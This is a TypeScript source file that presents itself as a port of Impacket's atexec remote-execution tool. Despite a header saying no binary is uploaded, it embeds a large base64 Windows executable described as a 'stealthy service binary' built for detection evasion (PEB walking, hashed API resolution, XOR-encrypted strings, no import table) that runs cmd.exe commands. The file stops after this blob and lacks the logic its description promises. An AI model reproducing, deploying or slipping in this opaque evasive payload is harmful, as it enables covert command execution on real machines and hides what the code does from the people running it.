#!/usr/bin/env node
// Impacket - Collection of TypeScript classes for working with network protocols.
//
// Copyright Fortra, LLC and its affiliated companies
//
// All rights reserved.
//
// This software is provided under a slightly modified version
// of the Apache Software License. See the accompanying LICENSE file
// for more information.
//
// Description:
//   This tool allows you to execute commands on a target machine through the
//   Task Scheduler service (ATSVC named pipe) and retrieves the output using
//   SMB. It does not upload any binary to the target, and works by creating a
//   scheduled task that runs immediately, captures output to a temp file, then
//   reads it back via SMB and cleans up.
//
// Author:
//   beto (@agsolino)
//   Ported to TypeScript
//
// Reference for:
//   DCE/RPC, TSCH, SMB.
//

import { Buffer } from 'node:buffer';
import { randomBytes } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { createInterface } from 'node:readline';
import { parseArgs } from 'node:util';
import {
  parseTarget,
  init as initLogger,
  info,
  error,
  debug,
  warning,
  critical,
  normalizeArgs,
  loadKeytabKeys,
  initProxy,
  BANNER,
} from '@impacket/examples';
import { SMBConnection } from '@impacket/smb-connection';
import {
  DCERPCTransportFactory,
  MSRPC_UUID_TSCHS,
  hSchRpcRegisterTask,
  hSchRpcRun,
  hSchRpcDelete,
  TASK_CREATE,
  TASK_LOGON_NONE,
  NULL,
  RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
  type SMBTransport,
  type DCERPC_v5,
} from '@impacket/dcerpc';
import {
  FILE_READ_DATA,
  FILE_SHARE_READ,
  FILE_SHARE_WRITE,
  FILE_SHARE_DELETE,
  DELETE,
  FILE_DELETE_ON_CLOSE,
  FILE_NON_DIRECTORY_FILE,
  FILE_OPEN,
  FILE_ATTRIBUTE_NORMAL,
} from '@impacket/smb3';

// --------------------------------------------------------------------------
// Helpers
// --------------------------------------------------------------------------

function randomLetters(n: number): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
  let result = '';
  const rng = randomBytes(n);
  for (let i = 0; i < n; i++) {
    result += chars[rng[i]! % chars.length]!;
  }
  return result;
}

function xmlEscape(data: string): string {
  const amp = String.fromCharCode(38) + 'amp;';
  const quot = String.fromCharCode(38) + 'quot;';
  const apos = String.fromCharCode(38) + 'apos;';
  const gt = String.fromCharCode(38) + 'gt;';
  const lt = String.fromCharCode(38) + 'lt;';
  return data
    .replace(/&/g, amp)
    .replace(/"/g, quot)
    .replace(/'/g, apos)
    .replace(/>/g, gt)
    .replace(/</g, lt);
}

function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}

// Stealthy service binary -- PEB walking, DJB2 hash API resolution, XOR string encryption, no import table
// Reads command from file arg1, runs cmd.exe /c <command>, writes output to file arg2, deletes arg1
const SMBEXECSVC_EXE = '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zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMV88fUp1sYUPRT+BGAAAAAGgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVcYNHYh9N1HQSKwAAAAAABgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAACAAIAAgACAAIAAgACAAIAAAACAAAAAgAAAAIAAAACAAAAAAAAAAIAAAAAAAAAAgA8PDw8PDw8PDw8PDw8PDw8AAQIDBAUGBwgJCgsMDQ4PAAAAAAAAAAAAAAAAAAAAgP9//3//f/9//3//f/9//38AgACAAIAAgACAAIAAgACAAHwAAAAAAAAAAAAAAAAAAP///3////9/////f////38AAACAAAAAgAAAAIAAAACAAACAfwAAgH8AAIB/AACAf/////////9//////////38AAAAAAAAAgAAAAAAAAACAAAAAAAAA8H8AAAAAAADwfwAAAAAAAAAAAAAAAAAAAID///////////////////9/AAAAAAAAAAAAAAAAAAD/fwAAgP8AAIB/AAAAXwAAAF8AAAAAAADgQwAAAF8AAID/AACAfwB8AHwAfAAAAAAAAAAAMEMAADBFAAAAAAAAAAAAAAAAAAAwQwAAAAAAADBFAAAAAAAAgF8AAIB/AAAAAAAAAIAAAACAAAAAgAAAAIAAAID/AACA/wAAgP8AAID//3//f/9//3//f/9//3//f////3////9/////f////3//f/9//3//f/9//3//f/9//////////3//////////f/////////9//////////3//f/9//3//f/9//3//f/9/////f////3////9/////f/////////9//////////3//f/9//3//f/9//3//f/9/////f////3////9/////fwAAwH8AAAAAAAAAAAAA+H////////////////////9/AAAAAAAAAAAAAAAAAID/fwAAwH8AAAAAAAAAAAAAAAAAgACAAIAAgACAAIAAgACA/3//f/9//3//f/9//3//fwAAAIAAAACAAAAAgAAAAID///9/////f////3////9/AADAfwAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAD4fwAAAAAAAAAAAAAAAAAAAAAAAAAAAID/fwB+AAAAAMB/AAAAAAAA+H8AAAAAAAAAAAAAAAAAgP9/AADAfwAAAAAAAAAAAAD4fwAAwH8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgP9/AACAPwAAgD8AAAAAAADwPwAAAAAAAAAAAAAAAAAA/z//f/9//3//f/9//3//f/9/AIAAgACAAIAAgACAAIAAgAB8AHwAfAB8AHwAfAB8AHwAAIB/AAAAAAAAAAAAAAAA////f////3////9/////fwAAgH8AAIB/AACAfwAAgH////9/////fwAAAAAAAAAAAACAfwAAgH8AAAAAAAAAAAAAgD8AAIA/AAAAAAAAAAAAAACAAAAAgAAAAIAAAACAAACAPwAAgH8AAAAAAAAAAP////////9//////////38AAAAAAADwfwAAAAAAAPB/AAAAAAAA8D8AAAAAAADwPwAAAAAAAACAAAAAAAAAAIAAAAAAAADwfwAAgH8AAAAAAAAAAAAAAAAAAAAAAAD/PwAAAAAAAAAAAAAAAAAAAID///////////////////9/AAAAAAAAAAAAAAAAAAD/f/9//3//f/9//3//f/9//38AgACAAIAAgACAAIAAgACAAHwAAAAAgH8AAAAAAAAAAP///3////9/////f////38AAACAAAAAgAAAAIAAAACAAACAfwAAgH8AAIB/AACAf////3////9/AAAAAAAAAAAAAIB/AACAfwAAAAAAAAAAAACAPwAAgD8AAAAAAAAAAAAAgD8AAIB/AAAAAAAAAAD/////////f/////////9/AAAAAAAAAIAAAAAAAAAAgAAAAAAAAPB/AAAAAAAA8H8AAAAAAADwPwAAAAAAAPA/AAAAAAAA8D8AAAAAAADwfwAAgP8AAIB/AAAAAAAAAAD///////////////////9/AAAAAAAAAAAAAAAAAAD/PwAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAP9/p0Y7jIfNxj6y+26J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